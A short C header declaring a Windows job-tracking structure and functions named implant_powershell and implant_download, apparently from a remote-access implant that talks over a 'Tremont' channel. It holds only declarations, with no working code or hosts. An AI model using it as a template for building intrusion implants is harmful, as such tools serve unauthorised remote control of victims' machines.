#pragma once

#define MAX_JOBS 64

#define JOB_ACTIVE 1
#define JOB_NOT    0

struct job_t {
    uint8_t active;
    HANDLE* job_thread;

    uint8_t progress;
};

struct jobs_t {
    CRITICAL_SECTION jobs_cs;
    struct job_t jobs[MAX_JOBS];

    HANDLE* main_thread_handle;
};

int track_job(HANDLE* job_thread, struct jobs_t* jobs);

void untrack_job(HANDLE* job_thread, struct jobs_t* jobs);

void implant_powershell(tremont_stream_id stream_id,
	Tremont_Nexus* nexus);

int implant_download(struct download_req_t* req);